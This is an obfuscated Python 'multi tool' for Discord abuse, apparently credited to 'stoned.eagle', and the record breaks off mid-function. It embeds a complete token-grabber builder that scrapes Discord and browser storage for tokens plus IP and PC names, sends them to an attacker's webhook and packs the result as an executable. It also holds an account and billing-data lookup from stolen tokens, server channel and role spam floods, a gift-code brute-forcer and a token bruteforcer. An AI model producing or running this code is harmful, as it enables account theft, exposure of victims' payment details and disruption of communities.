BA='https://discord.com/api/v6/users/@me'
B9='Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
B8='content'
B7='cls; clear'
B6='Amount: '
B5='channel_id'
B4='guild_id'
B3='global'
B2='retry_after'
B1='\x1b[38;5;195m'
B0='\x1b[4m'
A_='\x1b[1m'
Az='\x1b[0m'
Ay='\x1b[91m'
Ax='\x1b[93m'
Aw='\x1b[92m'
Av='\x1b[96m'
Au='\x1b[94m'
At='\x1b[95m'
As=KeyboardInterrupt
Ar=Exception
AQ='pause >nul'
AP='__main__'
AO='User-Agent'
AN='bot'
AM='locale'
AL='avatar'
AK='discriminator'
AJ='username'
AI='https://discordapp.com/api/v6/users/@me'
AH='stoned.eagle#0001'
A8='6'
A7=None
A6='text'
A5='w'
A4='a'
A3='/'
A2=enumerate
v='user'
u='type'
t='name'
q='application/json'
p=int
m='5'
l='4'
k='Content-Type'
j=exit
i=len
g=False
f=str
e=open
Y='Authorization'
X='cls'
V='1'
U=True
T='2'
S='3'
Q='clear'
P='\n'
M='.'
J='id'
I='authorization'
F=range
E=''
C=input
B=print
import os as G,time as N,datetime as A9,threading as AA,requests as K,json,random as D,string as A
from discord.ext import commands as AB
with e('nuker.json')as AR:AS=json.load(AR)
BB=At
Z=Au
H=Av
R=Aw
AT=Ax
W=Ay
BC=Az
AU=A_
BD=B0
BE=B1
h=AS.get('bottoken')
r={I:h}
AV=f"https://pastebin.com/raw/SHAm3hf9"
w=K.get(AV).text
x=f"https://pastebin.com/raw/5pTLb3Hy"
y=K.get(x).text
AW=f"https://pastebin.com/raw/bpvPSChn"
BF=K.get(AW).text
AC=AH
import sys
if AC==AH:0
else:B('Skid Loser No multi tool for uuu!');sys.exit()
def BG():G.system(X)
x=f"https://pastebin.com/raw/5pTLb3Hy"
y=K.get(x).text
def AX():
	import time as a,requests as R;from datetime import datetime as T;from colorama import Fore as A
	def D():
		Aa='    ';AZ='default';AY='invalid';AX='Default Payment Method';AW='Country';AV='State';AU='Postal Code';AT='City';AS='Address 2';AR='Address 1';AQ='Valid';AP='%Y-%m-%dT%H:%M:%S';AO='email';A1='Payment Type';B(f"{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} You can find: \n\n");B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Username           {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} User ID                   {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Creation Date             {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Avatar URL\n");B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Token              {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Nitro Status              {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Expiration date           {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Phone Number\n");B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Email              {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} 2FA/MFA Enabled           {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Flags                     {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Language\n");B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Email Verified     {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Payment Method            {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Payment Type\n\n\n");global d;B(f"{A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Enter the token on which you want to find information : ");d=f(C(f"\n{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Token\n > "));U={Y:d,k:q};A4={'da':'Danish, Denmark','de':'German, Germany','en-GB':'English, United Kingdom','en-US':'English, United States','es-ES':'Spanish, Spain','fr':'French, France','hr':'Croatian, Croatia','lt':'Lithuanian, Lithuania','hu':'Hungarian, Hungary','nl':'Dutch, Netherlands','no':'Norwegian, Norway','pl':'Polish, Poland','pt-BR':'Portuguese, Brazilian, Brazil','ro':'Romanian, Romania','fi':'Finnish, Finland','sv-SE':'Swedish, Sweden','vi':'Vietnamese, Vietnam','tr':'Turkish, Turkey','cs':'Czech, Czechia, Czech Republic','el':'Greek, Greece','bg':'Bulgarian, Bulgaria','ru':'Russian, Russia','uk':'Ukranian, Ukraine','th':'Thai, Thailand','zh-CN':'Chinese, China','ja':'Japanese','zh-TW':'Chinese, Taiwan','ko':'Korean, Korea'};A5={'american express':S,'visa':l,'mastercard':m};I=R.get(AI,headers=U)
		if I.status_code==200:
			F=I.json();A6=f"{F[AJ]}#{F[AK]}";V=F[J];b=F[AL];A7=f"https://cdn.discordapp.com/avatars/{V}/{b}.gif";c=F['phone'];e=F[AO];A8=F['mfa_enabled'];A9=F['flags'];h=F[AM];AA=F['verified'];AB=A4.get(h);AC=T.utcfromtimestamp(((p(V)>>22)+1420070400000)/1000).strftime('%d-%m-%Y %H:%M:%S UTC');N=g;I=R.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions',headers=U);W=I.json();N=bool(i(W)>0)
			if N:AD=T.strptime(W[0]['current_period_end'].split(M)[0],AP);AE=T.strptime(W[0]['current_period_start'].split(M)[0],AP);AF=abs((AE-AD).days)
			H=[]
			for D in R.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources',headers=U).json():
				G=D['billing_address'];n=G[t];o=G['line_1'];O=G['line_2'];r=G['city'];s=G['postal_code'];Q=G['state'];v=G['country']
				if D[u]==1:w=D['brand'];x=A5.get(w);AG=D['last_4'];X=f(D['expires_month']);AH=f(D['expires_year']);y={A1:'Credit Card',AQ:not D[AY],'CC Holder Name':n,'CC Brand':w.title(),'CC Number':E.join((A if(B+1)%2 else A+' 'for(B,A)in A2((x if x else'*')+'*'*11+AG))),'CC Exp. Date':('0'+X if i(X)<2 else X)+A3+AH[2:4],AR:o,AS:O if O else E,AT:r,AU:s,AV:Q if Q else E,AW:v,AX:D[AZ]}
				elif D[u]==2:y={A1:'PayPal',AQ:not D[AY],'PayPal Name':n,'PayPal Email':D[AO],AR:o,AS:O if O else E,AT:r,AU:s,AV:Q if Q else E,AW:v,AX:D[AZ]}
				H.append(y)
			B(f"\n{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Basic Information:");B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Username: {A6}");B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} User ID: {V}");B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Creation Date: {AC}");B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Avatar URL: {A7 if b else E}");B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Token: {d}\n\n");B(f"{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Nitro Information:");B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Nitro Status: {N}")
			if N:B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Expires in: {AF} day(s)\n\n")
			else:B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Expires in: None day(s)\n\n")
			B(f"{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Contact Information:");B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Phone Number: {c if c else E}");B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Email: {e if e else E}\n\n")
			if i(H)>0:
				B(f"{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Billing Information:")
				if i(H)==1:
					for D in H:
						for (Z,K) in D.items():
							if not K:continue
							B(A.RESET+'    {:<23}{}{}'.format(Z,A.CYAN,K))
				else:
					for (z,D) in A2(H):
						A0=f"Payment Method #{z+1} ({D[A1]})";B(Aa+A0);B(Aa+'='*i(A0))
						for (AN,(Z,K)) in A2(D.items()):
							if not K or AN==0:continue
							B(A.RESET+'        {:<23}{}{}'.format(Z,A.CYAN,K))
						if z<i(H)-1:B(P)
				B(P)
			B(f"{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Account Security:");B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} 2FA/MFA Enabled: {A8}");B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Flags: {A9}\n\n");B(f"{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Other:");B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Locale: {h} ({AB})");B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Email Verified: {AA}")
		elif I.status_code==401:B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTRED_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Invalid token");a.sleep(2);j(0)
		else:B(f"          {A.LIGHTYELLOW_EX}[{A.LIGHTRED_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} An error occurred while sending request");a.sleep(2);j(0)
		C(f"\n\n\n{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Press ENTER to go back to menu");L()
	D()
def BH():
	if s==v:z.run(h,bot=g)
	elif s==AN:z.run(h)
def AY():
	U='MT';G.system(Q);O();B('NOTE! 1 token loop = 5 Tokens of different types. ');R=C('How many tokens loop?: ');H=0;S=G.path.dirname(G.path.realpath(__file__))
	while p(H)<p(R):I=D.choice(A.ascii_letters).upper()+D.choice(A.ascii_letters).upper()+D.choice(A.ascii_letters)+E.join((D.choice(A.ascii_letters+A.digits)for B in F(21)))+M+D.choice(A.ascii_letters).upper()+E.join((D.choice(A.ascii_letters+A.digits)for B in F(5)))+M+E.join((D.choice(A.ascii_letters+A.digits)for B in F(27)));J=U+D.choice(A.ascii_letters)+E.join((D.choice(A.ascii_letters+A.digits)for B in F(21)))+M+D.choice(A.ascii_letters).upper()+E.join((D.choice(A.ascii_letters+A.digits)for B in F(5)))+M+E.join((D.choice(A.ascii_letters+A.digits)for B in F(27)));K='NT'+D.choice(A.ascii_letters)+E.join((D.choice(A.ascii_letters+A.digits)for B in F(21)))+M+D.choice(A.ascii_letters).upper()+E.join((D.choice(A.ascii_letters+A.digits)for B in F(5)))+M+E.join((D.choice(A.ascii_letters+A.digits)for B in F(27)));L='MD'+D.choice(A.ascii_letters)+E.join((D.choice(A.ascii_letters+A.digits)for B in F(21)))+M+D.choice(A.ascii_letters).upper()+E.join((D.choice(A.ascii_letters+A.digits)for B in F(5)))+M+E.join((D.choice(A.ascii_letters+A.digits)for B in F(27)));N=U+D.choice(A.ascii_letters)+E.join((D.choice(A.ascii_letters+A.digits)for B in F(21)))+M+D.choice(A.ascii_letters).upper()+E.join((D.choice(A.ascii_letters+A.digits)for B in F(5)))+M+E.join((D.choice(A.ascii_letters+A.digits)for B in F(27)));T=e(S+A3+f('Generated Tokens')+f(E)+'.txt',A4);T.write(I+P+J+P+K+P+L+P+N+P);B(I);B(J);B(K);B(L);B(N);H+=1
def AZ(token):
	if K.get('https://discord.com/api/v8/users/@me',headers={Y:token}).status_code==200:return v
	else:return AN
s=AZ(h)
if s==v:r={Y:f"{h}"};z=AB.Bot(command_prefix='!',case_insensitive=g,self_bot=U)
elif s==AN:r={Y:f"Bot {h}"};z=AB.Bot(command_prefix='!',case_insensitive=g)
AC=AH
Aa='\x1b[38;5;159m'
def O():B(f"""
  [38;5;111m█████╗ ███╗   ███╗██╗███████╗
  [38;5;159m██╔══ {Aa}██╗████╗ ████║██║╚══███╔╝
  [38;5;195m███████║██╔████╔██║██║  ███╔╝
  ██╔══██║██║╚██╔╝██║██║ ███╔╝  
  ██║  ██║██║ ╚═╝ ██║██║███████╗
  ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚══════╝
  {Z}{y} {w}                       
  """)
def Ab():
	from colorama import Fore as A;import time as D,sys as F,os as E,shutil as H;O()
	def G():
		def J():
			C=['|',A3,'-','\\']
			for E in C+C:F.stdout.write(f"\r{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Creating File... {E}");F.stdout.flush();D.sleep(0.2)
			B(P)
			for E in C+C+C+C:F.stdout.write(f"\r{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Writing File... {E}");F.stdout.flush();D.sleep(0.2)
		B(f"{A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Enter the name you want to give to the final file: ");global BI;G=f(C(f"{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} File name: "));B(f"\n\n{A.LIGHTYELLOW_EX}[{A.LIGHTWHITE_EX}+{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Enter your WebHook to generate a Token Grabber containing it: ");global AD;AD=f(C(f"{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Webhook Link: "));B(P);J()
		try:
			with e(f"temp/{G}.py",A5)as K:K.write('import os\nif os.name != "nt":\n    exit()\nfrom re import findall\nfrom json import loads, dumps\nfrom base64 import b64decode\nfrom subprocess import Popen, PIPE\nfrom urllib.request import Request, urlopen\nfrom datetime import datetime\nfrom threading import Thread\nfrom time import sleep\nfrom sys import argv\nLOCAL = os.getenv("LOCALAPPDATA")\nROAMING = os.getenv("APPDATA")\nPATHS = {\n    "Discord"           : ROAMING + "\\\\Discord",\n    "Discord Canary"    : ROAMING + "\\\\discordcanary",\n    "Discord PTB"       : ROAMING + "\\\\discordptb",\n    "Google Chrome"     : LOCAL + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",\n    "Opera"             : ROAMING + "\\\\Opera Software\\\\Opera Stable",\n    "Brave"             : LOCAL + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",\n    "Yandex"            : LOCAL + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default"\n}\ndef getheaders(token=None, content_type="application/json"):\n    headers = {\n        "Content-Type": content_type,\n        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"\n    }\n    if token:\n        headers.update({"Authorization": token})\n    return headers\ndef getuserdata(token):\n    try:\n        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())\n    except:\n        pass\ndef gettokens(path):\n    path += "\\\\Local Storage\\\\leveldb"\n    tokens = []\n    for file_name in os.listdir(path):\n        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):\n            continue\n        for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:\n            for regex in (r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", r"mfa\\.[\\w-]{84}"):\n                for token in findall(regex, line):\n                    tokens.append(token)\n    return tokens\ndef getip():\n    ip = "None"\n    try:\n        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()\n    except:\n        pass\n    return ip\ndef getavatar(uid, aid):\n    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"\n    try:\n        urlopen(Request(url))\n    except:\n        url = url[:-4]\n    return url\ndef gethwid():\n    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)\n    return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]\ndef getchat(token, uid):\n    try:\n        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]\n    except:\n        pass\ndef has_payment_methods(token):\n    try:\n        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)\n    except:\n        pass\ndef send_message(token, chat_id, form_data):\n    try:\n        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()\n    except:\n        pass\ndef main():\n    cache_path = ROAMING + "\\\\.cache~$"\n    embeds = []\n    working = []\n    checked = []\n    already_cached_tokens = []\n    working_ids = []\n    ip = getip()\n    pc_username = os.getenv("UserName")\n    pc_name = os.getenv("COMPUTERNAME")\n    for platform, path in PATHS.items():\n        if not os.path.exists(path):\n            continue\n        for token in gettokens(path):\n            if token in checked:\n                continue\n            checked.append(token)\n            uid = None\n            if not token.startswith("mfa."):\n                try:\n                    uid = b64decode(token.split(".")[0].encode()).decode()\n                except:\n                    pass\n                if not uid or uid in working_ids:\n                    continue\n            user_data = getuserdata(token)\n            if not user_data:\n                continue\n            working_ids.append(uid)\n            working.append(token)\n            username = user_data["username"] + "#" + str(user_data["discriminator"])\n            user_id = user_data["id"]\n            avatar_id = user_data["avatar"]\n            avatar_url = getavatar(user_id, avatar_id)\n            email = user_data.get("email")\n            phone = user_data.get("phone")\n            nitro = bool(user_data.get("premium_type"))\n            billing = bool(has_payment_methods(token))\n            embed = {\n                "color": 0x7289da,\n                "fields": [\n                    {\n                        "name": "**Account Info**",\n                        "value": f\'Email: {email}\\nPhone: {phone}\\nNitro: {nitro}\\nBilling Info: {billing}\',\n                        "inline": True\n                    },\n                    {\n                        "name": "**PC Info**",\n                        "value": f\'IP: {ip}\\nUsername: {pc_username}\\nPC Name: {pc_name}\\nToken Location: {platform}\',\n                        "inline": True\n                    },\n                    {\n                        "name": "**Token**",\n                        "value": token,\n                        "inline": False\n                    }\n                ],\n                "author": {\n                    "name": f"{username} ({user_id})",\n                    "icon_url": avatar_url\n                },\n                "footer": {\n                \n                }\n            }\n            embeds.append(embed)\n    with open(cache_path, "a") as file:\n        for token in checked:\n            if not token in already_cached_tokens:\n                file.write(token + "\\n")\n    if len(working) == 0:\n        working.append(\'123\')\n    webhook = {\n        "content": "",\n        "embeds": embeds,\n        "username": "Eagle Grabber",\n        "avatar_url": "https://pbs.twimg.com/media/El1vAVTXUAAPf_s.jpg"\n    }\n    try:\n        urlopen(Request("~~TOKENURLHERE~~", data=dumps(webhook).encode(), headers=getheaders()))\n    except:\n        pass\n\nmain()'.replace('~~TOKENURLHERE~~',AD))
		except Ar as L:B(f"\n\n\n\n{A.LIGHTYELLOW_EX}[{A.LIGHTRED_EX}!{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX}  Error writing file: {L}");E.system(2);E.system(X);j(0)
		B(f'\n\n\n{A.LIGHTYELLOW_EX}[{A.LIGHTGREEN_EX}!{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} File has been correctly written to "temp/{G}.py" ');I=C(f"\n{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Convert your script into an executable (Y/N) ? ")
		if I=='Y'or I=='y':D.sleep(1);E.system(X);B(f"{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} File creation...");D.sleep(1);E.system(f"pyinstaller -y -F -w --distpath temp --specpath temp --workpath temp temp/{G}.py");E.system(X);B(f"{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Cleaning up old files...");D.sleep(1);H.rmtree(f"temp/{G}");H.rmtree(f"temp/__pycache__");D.sleep(1);E.system(X);B(f"{A.LIGHTYELLOW_EX}[{A.LIGHTGREEN_EX}!{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} The executable file has been correctly generated");C(f"{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Press ENTER to exit")
		else:C(f"{A.LIGHTYELLOW_EX}[{A.LIGHTBLUE_EX}#{A.LIGHTYELLOW_EX}]{A.LIGHTWHITE_EX} Press ENTER to exit")
		j(0)
	G()
def Ac():
	M='ToCheck.txt';import requests as F,threading as D,time,sys;from colorama import Fore as A;O();B(A.YELLOW+A6);B(A.YELLOW+'============================================');import os;G=1;H=0;N=e(M,A5);B(f"{Z}[!] - Created");B(f"{AT}[!] - ToCheck.txt empty... Put usernames to check");B('Press enter once you have put names to check');os.system('pause');E=e(M,'r');I=E.read();C=I.split(P);E.close()
	def J(names):
		with e('Available.txt',A4,encoding='utf8')as A:A.write(names+P)
	K={AO:'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Referer':'https://accounts.snapchat.com/','Cookie':'xsrf_token=PlEcin8s5H600toD4Swngg; sc-cookies-accepted=true; web_client_id=b1e4a3c7-4a38-4c1a-9996-2c4f24f7f956; oauth_client_id=c2Nhbg==','Connection':'keep-alive',k:'application/x-www-form-urlencoded; charset=utf-8'};Q=0
	def L():
		try:
			global n;E='https://accounts.snapchat.com/accounts/get_username_suggestions?requested_username={}&xsrf_token=PlEcin8s5H600toD4Swngg'.format(C[n]);G=F.post(E,headers=K);H=G.json();D=H.get('reference').get('status_code')
			if D=='OK':B(A.GREEN+C[n]+' is available');J(C[n])
			elif D=='TAKEN':B(A.RED+C[n]+' is unavailable')
			n+=1
		except IndexError as I:sys.exit(0)
	while U:
		if D.active_count()<150:D.Thread(target=L,args=()).start();time.sleep(G);H+=1
class Ad:a=A9.datetime.now();b=A9.datetime.now();c=b-a
def Ae(guild,name):
	while U:
		B={t:name,u:0};A=K.post(f"https://discord.com/api/v8/guilds/{guild}/channels",headers=r,json=B)
		if B2 in A.text:N.sleep(A.json()[B3])
		elif A.status_code==200 or A.status_code==201 or A.status_code==204:break
def Af():
	def I():G.system(X)
	def D():
		B();C=K.get(A)
		if C.status_code==200:B(f"{R} Webhook is valid.");F()
		if C.status_code==404:B(f"[{W}! ] Webhook is invalid.");N.sleep(1.8);D()
	def E():
		B=K.get(A)
		if B.status_code==200:return B.json()
		if B.status_code==404:return A7
	def F():
		B();A=E()
		if not A==A7:
			B(f"[{R}+{H}] ID:\t\t",A[J]);B(f"[{R}+{H}] Token:\t",A['token']);B(f"[{R}+{H}] Guild ID:\t",A[B4]);B(f"[{R}+{H}] Channel ID:\t",A[B5]);B(f"[{R}+{H}] Name:\t",A[t])
			if A[AL]==A7:B(f"[{R}+{H}] Avatar:\t None")
			else:B(f"[{R}+{H}] Avatar:\t",'https://cdn.discordapp.com/avatars/'+A[J]+A3+A[AL]+'.png')
			N.sleep(2.5);L()
		else:B(f"[{W}-{H}] Webhook is invalid.")
		N.sleep(1.8);D()
	if __name__==AP:
		A=C(f"[{R}>{H}] Webhook: ")
		if'https://discord.com/api/webhooks/'in A:D()
		else:B(f"\n[{H}-{H}] Webhook is invalid.");N.sleep(1.8);D()
def Ag():
	import random as C,string as A,requests as H;G.system(Q);O()
	def I():B=A.ascii_letters+A.digits;return E.join((C.choice(B)for A in F(19)))
	class D:
		def __init__(A):A.codes=[];A.check()
		def check(E):
			J='a+';G='message'
			while U:
				A=I();E.codes.append(A);F=H.get('https://discord.com/api/v7/entitlements/gift-codes/'+A+'?with_application=false&with_subscription_plan=true');D=F.json()
				if D[G]=='Unknown Gift Code':B('Not worked: '+A)
				elif D[G]=='You are being rate limited.':B('Rate Limited: '+A);C=e('ratelimited.txt',J);C.write(P+A)
				else:B('Worked: '+A);C=e('workedcodes.txt',J);C.write(P+A)
	D()
def credits():B(f"{y} {w}");N.sleep(1.7);L()
def AE():
	B();A=C(f"{H}Guild ID: ");D=C('Channel Names: ');E=C(B6);G.system(B7);B('  Attempting to spam channels...');B(f"  [!] - Using Threads By Default")
	for I in F(p(E)):AA.Thread(target=Ae,args=(A,D)).start()
def Ah(guild,name):
	while U:
		B={t:name,u:0};A=K.post(f"https://discord.com/api/v8/guilds/{guild}/roles",headers=r,json=B)
		if B2 in A.text:N.sleep(A.json()[B3])
		elif A.status_code==200 or A.status_code==201 or A.status_code==204:break
def AF():
	B();A=C('\x1b[38;5;111mGuild ID: ');D=C('Role Names: ');E=C(B6);G.system(B7);B('Spamming Roles...')
	for H in F(p(E)):AA.Thread(target=Ah,args=(A,D)).start()
def Ai():
	A=C(' [INPUT] ENTER THE WEBHOOK TO DELETE : ')
	def E():
		K.delete(A);C=K.get(A)
		if C.status_code==404:B('\n [LOGS] WEBHOOK SUCCESFULLY DELETED');G.system(AQ)
		elif C.status_code==200:B('\n [LOGS] FAILED TO DELETE WEBHOOK');G.system(AQ)
	D=K.get(A)
	if D.status_code==404:B(f"\n {W}[-] -  THE WEBHOOK IS INVALID");N.sleep(1.8);L()
	elif D.status_code==200:B(f"\n {R}[+] - Deleted The Webhook");E();N.sleep(1.8);L()
def Aj():
	n=X;o=q;p=k;r=Y;s='S';t='R';u='Q';v='P';w='O';x='N';y='M';z='L';A0='K';A1='J';A2='I';A3='H';A6='G';A7='F';A9='E';AA='D';AB='C';AC='B';AD='A';AE=U;AF=As;Q='0';R='9';W='8';Z='7';a=A8;b=m;c=l;d=list;L=S;N=T;O=V;P='UTF-8';H=C;G=E;D=B;import sched,time as e,os as I;from urllib.request import urlopen,Request;import base64 as AG,random as f,string,requests as AH;from colorama import Fore as A,Back,Style as F;import sys;from tkinter import messagebox as AJ;import re,json
	def J():D('\n███████╗ █████╗  ██████╗ ██╗     ███████╗\n██╔════╝██╔══██╗██╔════╝ ██║     ██╔════╝\n█████╗  ███████║██║  ███╗██║     █████╗  \n██╔══╝  ██╔══██║██║   ██║██║     ██╔══╝  \n███████╗██║  ██║╚██████╔╝███████╗███████╗\n╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝\n                                         \n  \n  ')
	g=H('How much threads to use\n> ');AK=g
	if AK<'100':D('Too Much Threads... Setting to 100');g=100
	else:D(f"Now Using {g} Threads... Internal Proxys Have been connected")
	AO='stoned';AP='eagle';AQ='is';AR='Daddy'
	def K():
		D(f"{A.BLUE}[!]{F.RESET_ALL}   ID to perform the bruteforce on:",end=' ');id=H()
		if id.isdigit():
			if i(id)==18:
				C=id.encode(P);E=AG.b64encode(C);I=E.decode(P);D(f"{A.BLUE}[!]{F.RESET_ALL}    ID: Valid \n Press enter to perform bruteforce");J=H()
				if J==G:
					S=AI
					def T():
						B=G
						while AE:
							try:
